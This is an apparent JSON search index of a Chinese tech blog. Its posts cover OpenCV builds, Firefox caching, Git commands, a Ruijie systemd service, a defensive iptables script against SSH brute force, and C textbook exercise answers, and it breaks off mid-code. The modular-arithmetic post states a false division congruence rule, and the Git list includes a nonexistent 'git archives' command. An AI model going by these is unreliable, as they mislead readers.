（https://opencv.org/releases/）opencv源码从官网下载源码解压后应该是这样二、编译1.设置源码路径和编译后路径2.点击configure,然后选择配置编译器和编译的opencv库的位数这里我选64位，点击finish：3.等待4.勾选一下可选设置 （1）、勾选“BUILD_opencv_world”，最后生成一个头文件库，相比之前的一堆头文件方便多了。 （2）、添加下载好的modules到OPENCV_EXTRA_MODULES_PATH。 OPENCV_EXTRA_MODULES_PATH配置说明：由于OpenCV功能越来越臃肿，OpenCV3改变了项目架构，使用内核+插件的架构形式。 因此，OpenCV从2.x到4.x是一个很大的转变，对于很多功能不完善、性能不稳定的模块，都被放到了extra_modules（扩展模块）里面了。在Github中，除了存放正式版OpenCV的主仓库和新增加的OpenCV_extra仓库外，还添加了一个OpenCV_contrib的全新仓库，功能有：脸部识别、文本识别、边缘检测、追踪算法等，里面存放的是功能未稳定的代码，如果需要使用这些功能，就需要重新进行编译。 各个版本的opencv_contrib下载地址如下：https://github.com/opencv/opencv_contrib/releases （3）、如果要编译opencv的静态库，则需要去掉BUILD_SHARED_LIBS的对勾。 5.配置完成后，点击Generate,等待完成，需要一定时间。红色框体显示Generate完成 6.点击open Project按钮，打开我们编译生成的工程，选择：生成—批生成：配置完后，点击生成","categories":[],"tags":[{"name":"运维","slug":"运维","permalink":"https://czqu.net/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"修改火狐缓存位置到内存盘","slug":"draft/Modify-Firefox-cache-location-to-RAM-disk","date":"2020-11-13T05:07:11.000Z","updated":"2020-11-13T05:07:11.000Z","comments":true,"path":"posts/13213/","permalink":"https://czqu.net/posts/13213/","excerpt":"","text":"1、在地址栏输入about:config 进入设置界面 2、找到browser.cache.memory.max_entry_size设置使用内存缓存大小，设置值为-1，无限制，可以自己选择，设1的话是1kb，依次类推。 3、输入browser.cache.memory.enable，确认值为true，火狐默认为true。 4、输入”browser.cache.disk.enable”, 设置为false 5、然后在选项-高级-网络里，把无视自动缓存管理勾上，再把使用磁盘缓存空间设为0。 这样火狐的缓存就在内存里了。 比较简单，我这里就不上图片了。 最后输入 about:cache 可以查看缓存占用","categories":[],"tags":[{"name":"运维","slug":"运维","permalink":"https://czqu.net/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"c++杂七杂八的笔记","slug":"draft/cpp-study","date":"2020-11-13T05:05:29.000Z","updated":"2020-11-13T05:05:29.000Z","comments":true,"path":"posts/49948/","permalink":"https://czqu.net/posts/49948/","excerpt":"","text":"VS 2017 IDE compiler option” /permissive-“ 类中成员变量的声明顺序，决定了成员变量的初始化顺序。假设 Date 类中的构造函数为： public: Date() ： y_(2016), m_(9), d_(22) {} 此时，类中的成员函数，在类中的声明顺序 = 构造函数初始化列表顺序，故 y_, m_, d_ 都能被顺利的初始化为对应的值。 而当成员变量，在类中的声明顺序 ≠ 构造函数初始化列表顺序 时， public: Date() ： y_(2016), d_(22), m_(d_-13) {} 根据成员变量的声明顺序，y_ 首先被初始化为 2016，然后再初始化 m_，但由于 d_ 并未被初始化，所以 m_ 的值是随机的，最后初始化 d_ 为 22 这是因为，类的成员变量在初始化时，其初始化的顺序只与声明顺序有关，而与在初始化列表中的顺序无关。 scanf函数返回成功读入的数据项数，读入数据时遇到了“文件结束”则返回EOF。 win 换行\\r\\n linux \\n mac \\r linux读取win的文件会读\\r\\n 算法竞赛入门经典 46页","categories":[],"tags":[{"name":"cpp","slug":"cpp","permalink":"https://czqu.net/tags/cpp/"}]},{"title":"模运算规则","slug":"draft/Modular-operation-rules","date":"2020-11-13T05:03:51.000Z","updated":"2020-11-13T05:03:51.000Z","comments":true,"path":"posts/56689/","permalink":"https://czqu.net/posts/56689/","excerpt":"","text":"模运算与基本四则运算有些相似，但是除法例外。其规则如下： (a + b) % p = (a % p + b % p) % p (a - b) % p = (a % p - b % p) % p (a * b) % p = (a % p * b % p) % p (a^b) % p = ((a % p)^b) % p 推论： 若a≡b (% p)，则对于任意的c，都有(a + c) ≡ (b + c) (%p)； 若a≡b (% p)，则对于任意的c，都有(a * c) ≡ (b * c) (%p)； 若a≡b (% p)，c≡d (% p)，则 (a + c) ≡ (b + d) (%p)，(a - c) ≡ (b - d) (%p)， (a * c) ≡ (b * d) (%p)，(a / c) ≡ (b / d) (%p)； 费马定理：若p是素数，a是正整数且不能被p整除，则：a^(p-1) mod p = 1 mod p 推论：若p是素数，a是正整数且不能被p整除，则：a^p mod p = a mod p","categories":[],"tags":[{"name":"算法","slug":"算法","permalink":"https://czqu.net/tags/%E7%AE%97%E6%B3%95/"},{"name":"数学","slug":"数学","permalink":"https://czqu.net/tags/%E6%95%B0%E5%AD%A6/"}]},{"title":"一些个人常用的 Git 指令","slug":"draft/Some-personally-used-Git-commands","date":"2020-11-13T04:57:36.000Z","updated":"2020-11-13T04:57:36.000Z","comments":true,"path":"posts/57752/","permalink":"https://czqu.net/posts/57752/","excerpt":"","text":"随便整理的一些自用的Git指令 GitHub创建仓库提示代码123456echo \"# 项目名\" &gt;&gt; README.mdgit initgit add README.mdgit commit -m \"first commit\"git remote add origin git@github.com:qiubaiying/项目名.gitgit push -u origin master 若仓库存在直接push 12git remote add origin git@github.com:qiubaiying/test.gitgit push -u origin master 常用操作创建仓库（初始化）12345678在当前指定目录下创建git init新建一个仓库目录git init [project-name]克隆一个远程项目git clone [url] 添加文件到缓存区1添加所有变化的文件 git add . 12添加名称指定文件git add text.txt 配置123设置提交代码时的用户信息git config [--global] user.name \"[name]\"git config [--global] user.email \"[email address]\" 提交123456789101112131415161718提交暂存区到仓库区git commit -m \"msg\"# 提交暂存区的指定文件到仓库区$ git commit [file1] [file2] ... -m [message]# 提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a# 提交时显示所有diff信息$ git commit -v# 使用一次新的commit，替代上一次提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message]# 重做上一次commit，并包括指定文件的新变化$ git commit --amend [file1] [file2] ... 远程同步1234567891011121314151617181920212223# 下载远程仓库的所有变动$ git fetch [remote]# 显示所有远程仓库$ git remote -v# 显示某个远程仓库的信息$ git remote show [remote]# 增加一个新的远程仓库，并命名$ git remote add [shortname] [url]# 取回远程仓库的变化，并与本地分支合并$ git pull [remote] [branch]# 上传本地指定分支到远程仓库$ git push [remote] [branch]# 强行推送当前分支到远程仓库，即使有冲突$ git push [remote] --force# 推送所有分支到远程仓库$ git push [remote] --all 分支123456789101112131415161718192021222324252627282930313233343536373839404142# 列出所有本地分支$ git branch# 列出所有远程分支$ git branch -r# 列出所有本地分支和远程分支$ git branch -a# 新建一个分支，但依然停留在当前分支$ git branch [branch-name]# 新建一个分支，并切换到该分支$ git checkout -b [branch]# 新建一个分支，指向指定commit$ git branch [branch] [commit]# 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]# 切换到指定分支，并更新工作区$ git checkout [branch-name]# 切换到上一个分支$ git checkout -# 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支$ git merge [branch]# 选择一个commit，合并进当前分支$ git cherry-pick [commit]# 删除分支$ git branch -d [branch-name]# 删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote/branch] 标签Tags1234567891011121314151617181920212223添加标签 在当前commitgit tag -a v1.0 -m 'xxx' 添加标签 在指定commitgit tag v1.0 [commit]查看git tag删除git tag -d V1.0删除远程taggit push origin :refs/tags/[tagName]推送git push origin --tags拉取git fetch origin tag V1.0新建一个分支，指向某个taggit checkout -b [branch] [tag] 查看信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# 显示有变更的文件$ git status# 显示当前分支的版本历史$ git log# 显示commit历史，以及每次commit发生变更的文件$ git log --stat# 搜索提交历史，根据关键词$ git log -S [keyword]# 显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s# 显示某个commit之后的所有变动，其\"提交说明\"必须符合搜索条件$ git log [tag] HEAD --grep feature# 显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file]# 显示指定文件相关的每一次diff$ git log -p [file]# 显示过去5次提交$ git log -5 --pretty --oneline# 显示所有提交过的用户，按提交次数排序$ git shortlog -sn# 显示指定文件是什么人在什么时间修改过$ git blame [file]# 显示暂存区和工作区的差异$ git diff# 显示暂存区和上一个commit的差异$ git diff --cached [file]# 显示工作区与当前分支最新commit之间的差异$ git diff HEAD# 显示两次提交之间的差异$ git diff [first-branch]...[second-branch]# 显示今天你写了多少行代码$ git diff --shortstat \"@{0 day ago}\"# 显示某次提交的元数据和内容变化$ git show [commit]# 显示某次提交发生变化的文件$ git show --name-only [commit]# 显示某次提交时，某个文件的内容$ git show [commit]:[filename]# 显示当前分支的最近几次提交$ git reflog 撤销12345678910111213141516171819202122232425262728293031# 恢复暂存区的指定文件到工作区$ git checkout [file]# 恢复某个commit的指定文件到暂存区和工作区$ git checkout [commit] [file]# 恢复暂存区的所有文件到工作区$ git checkout .# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变$ git reset [file]# 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变$ git reset [commit]# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致$ git reset --hard [commit]# 重置当前HEAD为指定commit，但保持暂存区和工作区不变$ git reset --keep [commit]# 新建一个commit，用来撤销指定commit# 后者的所有变化都将被前者抵消，并且应用到当前分支$ git revert [commit]# 暂时将未提交的变化移除，稍后再移入$ git stash$ git stash pop 其他12# 生成一个可供发布的压缩包$ git archives","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://czqu.net/tags/git/"}]},{"title":"Linux 下将校园网客户端锐捷制作成服务并开机启动","slug":"draft/Make-campus-network-client-Ruijie-into-a-service","date":"2020-11-13T04:53:23.000Z","updated":"2020-11-13T04:53:23.000Z","comments":true,"path":"posts/37686/","permalink":"https://czqu.net/posts/37686/","excerpt":"","text":"1.下载锐捷，解压后给rjsupplicant.sh 添加可执行权限 2.创建一个 systemd 启动脚本并将其放在 /etc/systemd/system/ 目录中，内容如下 1234567891011121314151617# ruijie.service[Unit]Description=Run ruijieAfter=network.target[Service]ExecStart=/home/rjsupplicant/rjsupplicant.sh -u stuxxxx -p passwordxxxx -d 0 ExecStop=/home/rjsupplicant/rjsupplicant.sh -qExecReload=/home/rjsupplicant/rjsupplicant.sh -u stuxxxx -p passwordxxxx -d 0Restart=on-failureKillMode=control-group[Install]WantedBy=multi-user.target 3.运行以下命令启动服务 1234systemctl daemon-reloadsystemctl enable ruijie.servicesystemctl start ruijie #启动锐捷systemctl status ruijie #查看锐捷状态 4.重启检查是否启动 123rebootps aux|grep rjsupplicantping www.baidu.com","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"},{"name":"运维","slug":"运维","permalink":"https://czqu.net/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"简单抵御疑似黑客的ssh登录","slug":"draft/Simply-resist-ssh-login-from-suspected-hackers","date":"2020-11-13T04:51:39.000Z","updated":"2020-11-13T04:51:39.000Z","comments":true,"path":"posts/5423/","permalink":"https://czqu.net/posts/5423/","excerpt":"","text":"屏蔽每分钟ssh尝试登陆linux服务器 超过10次的IP进行屏蔽: 123456789#!/bin/bashDATE=$(date +\"%a %b %e %H:%M\") #星期月天时分 %e单数字时显示7，而%d显示07ABNORMAL_IP=$(lastb |grep \"$DATE\" |awk '{a[$3]++}END{for(i ina)if(a[i]&gt;10)print i}')for IP in $ABNORMAL_IP; do if [ $(iptables -vnL |grep -c \"$IP\") -eq 0 ]; then iptables -I INPUT -s $IP -j DROP fidone","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://czqu.net/tags/Linux/"},{"name":"运维","slug":"运维","permalink":"https://czqu.net/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"C语言程序设计现代方法答案","slug":"draft/C-Programming-A-Modern-Approach-key","date":"2020-11-13T04:46:33.000Z","updated":"2020-11-13T04:46:33.000Z","comments":true,"path":"posts/28638/","permalink":"https://czqu.net/posts/28638/","excerpt":"","text":"Chapter 2Answers to Selected Exercises2. [was #2] (a) The program contains one directive (#include) and four statements (three calls of printf and one return). (b) 123Parkinson's Law:Work expands so as to fill the timeavailable for its completion. 3. [was #4] 1234567891011121314#include &lt;stdio.h&gt; int main(void){ int height = 8, length = 12, width = 10, volume; volume = height * length * width; printf(\"Dimensions: %dx%dx%d\\n\", length, width, height); printf(\"Volume (cubic inches): %d\\n\", volume); printf(\"Dimensional weight (pounds): %d\\n\", (volume + 165) / 166); return 0;} 4. [was #6] Here’s one possible program: 1234567891011121314151617#include &lt;stdio.h&gt; int main(void){ int i, j, k; float x, y, z; printf(\"Value of i: %d\\n\", i); printf(\"Value of j: %d\\n\", j); printf(\"Value of k: %d\\n\", k); printf(\"Value of x: %g\\n\", x); printf(\"Value of y: %g\\n\", y); printf(\"Value of z: %g\\n\", z); return 0;} When compiled using GCC and then executed, this program produced the following output: 123456Value of i: 5618848Value of j: 0Value of k: 6844404Value of x: 3.98979e-34Value of y: 9.59105e-39Value of z: 9.59105e-39 The values printed depend on many factors, so the chance that you’ll get exactly these numbers is small. 5. [was #10] (a) is not legal because 100_bottles begins with a digit. 8. [was #12] There are 14 tokens: a, =, (, 3, *, q, -, p, *, p, ), /, 3, and ;. Answers to Selected Programming Projects4. [was #8; modified] 12345678910111213#include &lt;stdio.h&gt; int main(void){ float original_amount, amount_with_tax; printf(\"Enter an amount: \"); scanf(\"%f\", &amp;original_amount); amount_with_tax = original_amount * 1.05f; printf(\"With tax added: $%.2f\\n\", amount_with_tax); return 0;} The amount_with_tax variable is unnecessary. If we remove it, the program is slightly shorter: 123456789101112#include &lt;stdio.h&gt; int main(void){ float original_amount; printf(\"Enter an amount: \"); scanf(\"%f\", &amp;original_amount); printf(\"With tax added: $%.2f\\n\", original_amount * 1.05f); return 0;} Chapter 3 Answers to Selected Exercises 2. [was #2] (a) printf(“%-8.1e”, x); (b) printf(“%10.6e”, x); (c) printf(“%-8.3f”, x); (d) printf(“%6.0f”, x); 5. [was #8] The values of x, i, and y will be 12.3, 45, and .6, respectively. Answers to Selected Programming Projects 1. [was #4; modified] #include &lt;stdio.h&gt; int main(void) { int month, day, year; printf(“Enter a date (mm/dd/yyyy): “); scanf(“%d/%d/%d”, &amp;month, &amp;day, &amp;year); printf(“You entered the date %d%.2d%.2d\\n”, year, month, day); return 0; } 3. [was #6; modified] #include &lt;stdio.h&gt; int main(void) { int prefix, group, publisher, item, check_digit; printf(“Enter ISBN: “); scanf(“%d-%d-%d-%d-%d”, &amp;prefix, &amp;group, &amp;publisher, &amp;item, &amp;check_digit); printf(“GS1 prefix: %d\\n”, prefix); printf(“Group identifier: %d\\n”, group); printf(“Publisher code: %d\\n”, publisher); printf(“Item number: %d\\n”, item); printf(“Check digit: %d\\n”, check_digit); /* The five printf calls can be combined as follows: printf(“GS1 prefix: %d\\nGroup identifier: %d\\nPublisher code: %d\\nItem number: %d\\nCheck digit: %d\\n”, ​ prefix, group, publisher, item, check_digit); */ return 0; } Chapter 4 Answers to Selected Exercises 2. [was #2] Not in C89. Suppose that i is 9 and j is 7. The value of (-i)/j could be either –1 or –2, depending on the implementation. On the other hand, the value of -(i/j) is always –1, regardless of the implementation. In C99, on the other hand, the value of (-i)/j must be equal to the value of -(i/j). 9. [was #6] (a) 63 8 (b) 3 2 1 (c) 2 -1 3 (d) 0 0 0 13. [was #8] The expression ++i is equivalent to (i += 1). The value of both expressions is i after the increment has been performed. Answers to Selected Programming Projects 2. [was #4] #include &lt;stdio.h&gt; int main(void) { int n; printf(“Enter a three-digit number: “); scanf(“%d”, &amp;n); printf(“The reversal is: %d%d%d\\n”, n % 10, (n / 10) % 10, n / 100); return 0; } Chapter 5 Answers to Selected Exercises 2. [was #2] (a) 1 (b) 1 (c) 1 (d) 1 4. [was #4] (i &gt; j) - (i &lt; j) 6. [was #12] Yes, the statement is legal. When n is equal to 5, it does nothing, since 5 is not equal to –9. 10. [was #16] The output is onetwo since there are no break statements after the cases. Answers to Selected Programming Projects 2. [was #6] #include &lt;stdio.h&gt; int main(void) { int hours, minutes; printf(“Enter a 24-hour time: “); scanf(“%d:%d”, &amp;hours, &amp;minutes); printf(“Equivalent 12-hour time: “); if (hours == 0) printf(“12:%.2d AM\\n”, minutes); else if (hours &lt; 12) printf(“%d:%.2d AM\\n”, hours, minutes); else if (hours == 12) printf(“%d:%.2d PM\\n”, hours, minutes); else printf(“%d:%.2d PM\\n”, hours - 12, minutes); return 0; } 4. [was #8; modified] #include &lt;stdio.h&gt; int main(void) { int speed; printf(“Enter a wind speed in knots: “); scanf(“%d”, &amp;speed); if (speed &lt; 1) printf(“Calm\\n”); else if (speed &lt;= 3) printf(“Light air\\n”); else if (speed &lt;= 27) printf(“Breeze\\n”); else if (speed &lt;= 47) printf(“Gale\\n”); else if (speed &lt;= 63) printf(“Storm\\n”); else printf(“Hurricane\\n”); return 0; } 6. [was #10] #include &lt;stdio.h&gt; int main(void) { int check_digit, d, i1, i2, i3, i4, i5, j1, j2, j3, j4, j5, first_sum, second_sum, total; printf(“Enter the first (single) digit: “); scanf(“%1d”, &amp;d); printf(“Enter first group of five digits: “); scanf(“%1d%1d%1d%1d%1d”, &amp;i1, &amp;i2, &amp;i3, &amp;i4, &amp;i5); printf(“Enter second group of five digits: “); scanf(“%1d%1d%1d%1d%1d”, &amp;j1, &amp;j2, &amp;j3, &amp;j4, &amp;j5); printf(“Enter the last (single) digit: “); scanf(“%1d”, &amp;check_digit); first_sum = d + i2 + i4 + j1 + j3 + j5; second_sum = i1 + i3 + i5 + j2 + j4; total = 3 * first_sum + second_sum; if (check_digit == 9 - ((total - 1) % 10)) printf(“VALID\\n”); else printf(“NOT VALID\\n”); return 0; } 10. [was #14] #include &lt;stdio.h&gt; int main(void) { int grade; printf(“Enter numerical grade: “); scanf(“%d”, &amp;grade); if (grade &lt; 0 || grade &gt; 100) { printf(“Illegal grade\\n”); return 0; } switch (grade / 10) { case 10: case 9: printf(“Letter grade: A\\n”); ​ break; case 8: printf(“Letter grade: B\\n”); ​ break; case 7: printf(“Letter grade: C\\n”); ​ break; case 6: printf(“Letter grade: D\\n”); ​ break; case 5: case 4: case 3: case 2: case 1: case 0: printf(“Letter grade: F\\n”); ​ break; } return 0; } Chapter 6Answers to Selected Exercises4. [was #10] (c) is not equivalent to (a) and (b), because i is incremented before the loop body is executed. 10. [was #12] Consider the following while loop: 12345while (…) { … continue; …} The equivalent code using goto would have the following appearance: 123456while (…) { … goto loop_end; … loop_end: ; /* null statement */} 12. [was #14] 123for (d = 2; d * d &lt;= n; d++) if (n % d == 0) break; The if statement that follows the loop will need to be modified as well: 1234if (d * d &lt;= n) printf(\"%d is divisible by %d\\n\", n, d);else printf(\"%d is prime\\n\", n); 14. [was #16] The problem is the semicolon at the end of the first line. If we remove it, the statement is now correct: 12if (n % 2 == 0) printf(\"n is even\\n\"); Answers to Selected Programming Projects2. [was #2] 12345678910111213141516171819#include &lt;stdio.h&gt; int main(void){ int m, n, remainder; printf(\"Enter two integers: \"); scanf(\"%d%d\", &amp;m, &amp;n); while (n != 0) { remainder = m % n; m = n; n = remainder; } printf(\"Greatest common divisor: %d\\n\", m); return 0;} 4. [was #4] 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt; int main(void){ float commission, value; printf(\"Enter value of trade: \"); scanf(\"%f\", &amp;value); while (value != 0.0f) { if (value &lt; 2500.00f) commission = 30.00f + .017f * value; else if (value &lt; 6250.00f) commission = 56.00f + .0066f * value; else if (value &lt; 20000.00f) commission = 76.00f + .0034f * value; else if (value &lt; 50000.00f) commission = 100.00f + .0022f * value; else if (value &lt; 500000.00f) commission = 155.00f + .0011f * value; else commission = 255.00f + .0009f * value; if (commission &lt; 39.00f) commission = 39.00f; printf(\"Commission: $%.2f\\n\\n\", commission); printf(\"Enter value of trade: \"); scanf(\"%f\", &amp;value); } return 0;} 6. [was #6] 1234567891011121314#include &lt;stdio.h&gt; int main(void){ int i, n; printf(\"Enter limit on maximum square: \"); scanf(\"%d\", &amp;n); for (i = 2; i * i &lt;= n; i += 2) printf(\"%d\\n\", i * i); return 0;} 8. [was #8] 123456789101112131415161718192021222324#include &lt;stdio.h&gt; int main(void){ int i, n, start_day; printf(\"Enter number of days in month: \"); scanf(\"%d\", &amp;n); printf(\"Enter starting day of the week (1=Sun, 7=Sat): \"); scanf(\"%d\", &amp;start_day); /* print any leading \"blank dates\" */ for (i = 1; i &lt; start_day; i++) printf(\" \"); /* now print the calendar */ for (i = 1; i &lt;= n; i++) { printf(\"%3d\", i); if ((start_day + i - 1) % 7 == 0) printf(\"\\n\"); } return 0;} Chapter 7Answers to Selected Exercises3. [was #4] (b) is not legal. 4. [was #6] (d) is illegal, since printf requires a string, not a character, as its first argument. 10. [was #14] unsigned int, because the (int) cast applies only to j, not j * k. 12. [was #16] The value of i is converted to float and added to f, then the result is converted to double and stored in d. 14. [was #18] No. Converting f to int will fail if the value stored in f exceeds the largest value of type int. Answers to Selected Programming Projects1. [was #2] short int values are usually stored in 16 bits, causing failure at 182. int and long int values are usually stored in 32 bits, with failure occurring at 46341. 2. [was #8] 123456789101112131415161718192021222324#include &lt;stdio.h&gt; int main(void){ int i, n; char ch; printf(\"This program prints a table of squares.\\n\"); printf(\"Enter number of entries in table: \"); scanf(\"%d\", &amp;n); ch = getchar(); /* dispose of new-line character following number of entries */ /* could simply be getchar(); */ for (i = 1; i &lt;= n; i++) { printf(\"%10d%10d\\n\", i, i * i); if (i % 24 == 0) { printf(\"Press Enter to continue...\"); ch = getchar(); /* or simply getchar(); */ } } return 0;} 5. [was #10] 1234567891011121314151617181920212223242526272829303132#include &lt;ctype.h&gt;#include &lt;stdio.h&gt; int main(void){ int sum = 0; char ch; printf(\"Enter a word: \"); while ((ch = getchar()) != '\\n') switch (toupper(ch)) { case 'D': case 'G': sum += 2; break; case 'B': case 'C': case 'M': case 'P': sum += 3; break; case 'F': case 'H': case 'V': case 'W': case 'Y': sum += 4; break; case 'K': sum += 5; break; case 'J': case 'X': sum += 8; break; case 'Q': case 'Z': sum += 10; break; default: sum++; break; } printf(\"Scrabble value: %d\\n\", sum); return 0;} 6. [was #12] 12345678910111213#include &lt;stdio.h&gt; int main(void){ printf(\"Size of int: %d\\n\", (int) sizeof(int)); printf(\"Size of short: %d\\n\", (int) sizeof(short)); printf(\"Size of long: %d\\n\", (int) sizeof(long)); printf(\"Size of float: %d\\n\", (int) sizeof(float)); printf(\"Size of double: %d\\n\", (int) sizeof(double)); printf(\"Size of long double: %d\\n\", (int) sizeof(long double)); return 0;} Since the type of a sizeof expression may vary from one implementation to another, it’s necessary in C89 to cast sizeof expressions to a known type before printing them. The sizes of the basic types are small numbers, so it’s safe to cast them to int. (In general, however, it’s best to cast sizeof expressions to unsigned long and print them using %lu.) In C99, we can avoid the cast by using the %zu conversion specification. Chapter 8Answers to Selected Exercises1. [was #4] The problem with sizeof(a) / sizeof(t) is that it can’t easily be checked for correctness by someone reading the program. (The reader would have to locate the declaration of a and make sure that its elements have type t.) 2. [was #8] To use a digit d (in character form) as a subscript into the array a, we would write a[d-'0']. This assumes that digits have consecutive codes in the underlying character set, which is true of ASCII and other popular character sets. 7. [was #10] 12345678910const int segments[10][7] = {{1, 1, 1, 1, 1, 1}, {0, 1, 1}, {1, 1, 0, 1, 1, 0, 1}, {1, 1, 1, 1, 0, 0, 1}, {0, 1, 1, 0, 0, 1, 1}, {1, 0, 1, 1, 0, 1, 1}, {1, 0, 1, 1, 1, 1, 1}, {1, 1, 1}, {1, 1, 1, 1, 1, 1, 1}, {1, 1, 1, 1, 0, 1, 1}}; Answers to Selected Programming Projects2. [was #2] 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt; int main(void){ int digit_count[10] = {0}; int digit; long n; printf(\"Enter a number: \"); scanf(\"%ld\", &amp;n); while (n &gt; 0) { digit = n % 10; digit_count[digit]++; n /= 10; } printf (\"Digit: \"); for (digit = 0; digit &lt;= 9; digit++) printf(\"%3d\", digit); printf(\"\\nOccurrences:\"); for (digit = 0; digit &lt;= 9; digit++) printf(\"%3d\", digit_count[digit]); printf(\"\\n\"); return 0;} 5. [was #6] 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt; #define NUM_RATES ((int) (sizeof(value) / sizeof(value[0])))#define INITIAL_BALANCE 100.00 int main(void){ int i, low_rate, month, num_years, year; double value[5]; printf(\"Enter interest rate: \"); scanf(\"%d\", &amp;low_rate); printf(\"Enter number of years: \"); scanf(\"%d\", &amp;num_years); printf(\"\\nYears\"); for (i = 0; i &lt; NUM_RATES; i++) { printf(\"%6d%%\", low_rate + i); value[i] = INITIAL_BALANCE; } printf(\"\\n\"); for (year = 1; year &lt;= num_years; year++) { printf(\"%3d \", year); for (i = 0; i &lt; NUM_RATES; i++) { for (month = 1; month &lt;= 12; month++) value[i] += ((double) (low_rate + i) / 12) / 100.0 * value[i]; printf(\"%7.2f\", value[i]); } printf(\"\\n\"); } return 0;} 8. [was #12] 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt; #define NUM_QUIZZES 5#define NUM_STUDENTS 5 int main(void){ int grades[NUM_STUDENTS][NUM_QUIZZES]; int high, low, quiz, student, total; for (student = 0; student &lt; NUM_STUDENTS; student++) { printf(\"Enter grades for student %d: \", student + 1); for (quiz = 0; quiz &lt; NUM_QUIZZES; quiz++) scanf(\"%d\", &amp;grades[student][quiz]); } printf(\"\\nStudent Total Average\\n\"); for (student = 0; student &lt; NUM_STUDENTS; student++) { printf(\"%4d \", student + 1); total = 0; for (quiz = 0; quiz &lt; NUM_QUIZZES; quiz++) total += grades[student][quiz]; printf(\"%3d %3d\\n\", total, total / NUM_QUIZZES); } printf(\"\\nQuiz Average High Low\\n\"); for (quiz = 0; quiz &lt; NUM_QUIZZES; quiz++) { printf(\"%3d \", quiz + 1); total = 0; high = 0; low = 100; for (student = 0; student &lt; NUM_STUDENTS; student++) { total += grades[student][quiz]; if (grades[student][quiz] &gt; high) high = grades[student][quiz]; if (grades[student][quiz] &lt; low) low = grades[student][quiz]; } printf(\"%3d %3d %3d\\n\", total / NUM_STUDENTS, high, low); } return 0;} Chapter 9Answers to Selected Exercises2. [was #2] 1234int check(int x, int y, int n){ return (x &gt;= 0 &amp;&amp; x &lt;= n - 1 &amp;&amp; y &gt;= 0 &amp;&amp; y &lt;= n - 1);} 4. [was #4] 1234567891011121314int day_of_year(int month, int day, int year){ int num_days[] = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}; int day_count = 0, i; for (i = 1; i &lt; month; i++) day_count += num_days[i-1]; /* adjust for leap years, assuming they are divisible by 4 */ if (year % 4 == 0 &amp;&amp; month &gt; 2) day_count++; return day_count + day;} Using the expression year % 4 == 0 to test for leap years is not completely correct. Centuries are special cases: if a year is a multiple of 100, then it must also be a multiple of 400 in order to be a leap year. The correct test is 1year % 4 == 0 &amp;&amp; (year % 100 != 0 || year % 400 == 0) 6. [was #6; modified] 123456789int digit(int n, int k){ int i; for (i = 1; i &lt; k; i++) n /= 10; return n % 10;} 8. [was #8] (a) and (b) are valid prototypes. (c) is illegal, since it doesn’t specify the type of the parameter. (d) incorrectly specifies that f returns an int value in C89; in C99, omitting the return type is illegal. 10. [was #10] (a) 12345678910int largest(int a[], int n){ int i, max = a[0]; for (i = 1; i &lt; n; i++) if (a[i] &gt; max) max = a[i]; return max;} (b) 123456789int average(int a[], int n){ int i, avg = 0; for (i = 0; i &lt; n; i++) avg += a[i]; return avg / n;} (c) 12345678910int num_positive(int a[], int n){ int i, count = 0; for (i = 0; i &lt; n; i++) if (a[i] &gt; 0) count++; return count;} 15. [was #12; modified] 12345678910111213141516double median(double x, double y, double z){ double result; if (x &lt;= y) if (y &lt;= z) result = y; else if (x &lt;= z) result = z; else result = x; else { if (z &lt;= y) result = y; else if (x &lt;= z) result = x; else result = z; } return result;} 17. [was #14] 123456789int fact(int n){ int i, result = 1; for (i = 2; i &lt;= n; i++) result *= i; return result;} 19. [was #16] The following program tests the pb function: 12345678910111213141516171819202122232425#include &lt;stdio.h&gt; void pb(int n); int main(void){ int n; printf(\"Enter a number: \"); scanf(\"%d\", &amp;n); printf(\"Output of pb: \"); pb(n); printf(\"\\n\"); return 0;} void pb(int n){ if (n != 0) { pb(n / 2); putchar('0' + n % 2); }} pb prints the binary representation of the argument n, assuming that n is greater than 0. (We also assume that digits have consecutive codes in the underlying character set.) For example: 12Enter a number: 53Output of pb: 110101 A trace of pb‘s execution would look like this: pb(53) finds that 53 is not equal to 0, so it calls pb(26), which finds that 26 is not equal to 0, so it calls pb(13), which finds that 13 is not equal to 0, so it calls pb(6), which finds that 6 is not equal to 0, so it calls pb(3), which finds that 3 is not equal to 0, so it calls pb(1), which finds that 1 is not equal to 0, so it calls pb(0), which finds that 0 is equal to 0, so it returns, causing pb(1) to print 1 and return, causing pb(3) to print 1 and return, causing pb(6) to print 0 and return, causing pb(13) to print 1 and return, causing pb(26) to print 0 and return, causing pb(53) to print 1 and return. Chapter 10Answers to Selected Exercises1. [was #2] (a) a, b, and c are visible. (b) a, and d are visible. (c) a, d, and e are visible. (d) a and f are visible. Answers to Selected Programming Projects3. [was #4] 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191#include &lt;stdbool.h&gt; /* C99 only */#include 